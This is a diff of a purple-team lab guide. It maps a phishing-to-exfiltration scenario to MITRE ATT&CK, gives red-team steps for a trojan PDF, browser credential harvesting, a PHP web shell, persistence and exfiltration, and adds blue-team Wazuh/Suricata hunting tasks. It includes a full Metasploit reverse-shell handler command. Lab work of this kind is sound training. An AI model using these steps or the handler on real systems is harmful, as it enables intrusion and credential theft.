@@ -33,27 +33,27 @@ Setup: connect the 4 lab VMs to the same isolated virtual network. All IPs in th
 
 ## MITRE ATT&CK Mapping
 
-**Scenario:** Spear Phishing -> Deliver Trojan File to Client -> Hash Dump -> Lateral Movement to Web Server -> Web Shell Creation -> Lateral Movement to DB Machine -> Schedule Tasks on Target -> Exfiltration using Web Shell
+**Scenario:** Spear Phishing -> Deliver Trojan File to Client -> Hash Dump -> Lateral Movement to the Web Server -> Web Shell Creation -> Lateral Movement to DB Machine -> Schedule Tasks on Target -> Exfiltration using Web Shell
 
 | Scenario Step | MITRE ATT&CK Technique | Tactic |
 |---|---|---|
 | Spear Phishing | [T1566.001 - Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) | Initial Access |
-| Deliver Trojan File to Client | [T1204.002 - User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/), [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) | Execution / Command and Control |
-| Hash Dump | [T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/), [T1003.001 - LSASS Memory](https://attack.mitre.org/techniques/T1003/001/), [T1003.002 - Security Account Manager](https://attack.mitre.org/techniques/T1003/002/) | Credential Access |
-| Lateral Movement to Web Server | [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/), [T1021.002 - SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/), [T1021.006 - Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) | Lateral Movement |
-| Use Dumped Hashes | [T1550.002 - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/) | Lateral Movement |
+| Deliver Trojan File to Client | [T1204.002 - User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/) | Execution |
+| Hash Dump | [T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/) | Credential Access |
+| Lateral Movement to the Web Server | [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/) | Lateral Movement |
 | Web Shell Creation | [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) | Persistence |
-| Lateral Movement to DB Machine | [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/), [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/) | Lateral Movement / Defense Evasion / Persistence |
+| Lateral Movement to DB Machine | [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/) | Lateral Movement |
 | Schedule Tasks on Target | [T1053.005 - Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) | Execution / Persistence / Privilege Escalation |
 | Exfiltration using Web Shell | [T1041 - Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/), [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/) | Exfiltration / Command and Control |
 
+
 - Compact Technique Chain
 
-  `T1566.001 -> T1204.002 -> T1105 -> T1003 -> T1550.002 -> T1021 -> T1505.003 -> T1021/T1078 -> T1053.005 -> T1071.001/T1041`
+  `T1566.001 -> T1204.002 -> T1003 -> T1021 -> T1505.003 -> T1021 -> T1053.005 -> T1041/T1071.001`
 
-## Red Team Notes
+# Red Team Notes
 
-### 1. Prepare Windows Client
+## Prepare Windows Client
 
 Create local admin user in an admin command prompt:
 
@@ -77,7 +77,7 @@ After restart:
 - Install vulnerable Adobe Reader 9 from <https://archive.org/download/AdobeReaderArchives6x11x/Reader%209.0/ENU/AdbeRdr90_en_US_Std.exe>.
 - In Adobe Reader: Preferences > Trust Manager > disable auto update.
 
-### 2. Deliver Trojan PDF
+## `Deliver Trojan PDF` & `Deliver Trojan File to Client`
 
 Use SEToolkit in Kali:
 
@@ -112,7 +112,7 @@ Start the handler:
 sudo msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.8.10; set lport 4444; exploit"
 ```
 
-### 3. Victim Execution
+### Victim Execution
 
 On Windows:
 
@@ -123,9 +123,9 @@ On Windows:
 
 Expected result: Meterpreter session from the Windows client to Kali.
 
-### 4. Credential Access
+## `Credential Access` & `Hash Dump (will update lated with mimikatz)` 
 
-#### Firefox path to collect:
+### Firefox path to collect:
 
 - If credentials save in Firefox in Windows, do the below:
 
@@ -152,7 +152,7 @@ Expected result: Meterpreter session from the Windows client to Kali.
   Password: 'password'
   ```
 
-#### Edge paths to collect (Will be updated later):
+#### Edge paths to collect:
 
 - If credentials save in NS Edge in Windows, follow:
 
@@ -253,7 +253,7 @@ Expected result: Meterpreter session from the Windows client to Kali.
     MasterKey GUID: 3b65c54f-d94d-45b3-a91e-9df6eade0559
     ```
 
-### 5. Lateral Movement to Web and DB server
+## `Lateral Movement to Web Server`
 
 Use the recovered credential to access Hullu.
 
@@ -263,7 +263,7 @@ Evidence to create for blue team:
 - File transfer into web root.
 - Web process activity after shell use.
 
-### 6. Web Shell Creation
+## `Web Shell Creation`
 
 - Create a PHP web shell in the Hullu web root.
     ```sh
@@ -280,7 +280,7 @@ Expected attacker behavior:
 
 More details in this [scenario](scenario.md).
 
-### 7. DB Service Access on Hullu
+## `Lateral Movement to DB Machine`
 
 Access the DB service on [Hullu](README.md).
 
@@ -289,7 +289,7 @@ Evidence to create for blue team:
 - DB access from the web context.
 - DB dump, query, archive, or staged file appears.
 
-### 8. Scheduled Task on Target
+## `Scheduled Task on Target`
 
 Create persistence on the selected target.
 
@@ -304,7 +304,7 @@ Evidence to create for blue team:
 - Suspicious command path.
 - Repeated execution time.
 
-### 9. Exfiltration Using Web Shell
+## `Exfiltration Using Web Shell`
 
 Use the web shell to retrieve staged DB data.
 
@@ -314,11 +314,11 @@ Evidence to create for blue team:
 - Repeated requests to `shell.php`.
 - Download of archive, dump, or encoded output.
 
-## Blue Team Work
+# Blue Team Work
 
 Use the [SuriZuh](https://github.com/kaledaljebur/SuriZuh) virtual machine for the Wazuh and Suricata analysis.
 
-### Blue Objective
+## Blue Objective
 
 Find the full intrusion path:
 
@@ -326,7 +326,7 @@ Find the full intrusion path:
 phishing -> client compromise -> credential theft -> Hullu access -> web shell -> DB access -> persistence -> exfiltration
 ```
 
-### Wazuh Focus
+## Wazuh Focus
 
 On the Windows client:
 
@@ -355,7 +355,7 @@ Useful Wazuh references:
 - [Wazuh Sysmon and MITRE mapping](https://documentation.wazuh.com/current/user-manual/ruleset/mitre.html)
 - [Wazuh + Suricata integration](https://documentation.wazuh.com/current/proof-of-concept-guide/integrate-network-ids-suricata.html)
 
-### Suricata Focus
+## Suricata Focus
 
 Look for:
 
@@ -377,7 +377,7 @@ event_type:alert
 event_type:http
 ```
 
-### Investigation Questions
+## Investigation Questions
 
 1. Which user opened the phishing attachment?
 2. What process created the reverse connection?
@@ -388,7 +388,7 @@ event_type:http
 7. Was persistence created?
 8. What data was exfiltrated?
 
-### Expected Blue Deliverables
+## Expected Blue Deliverables
 
 - Incident timeline.
 - Patient-zero host and user.
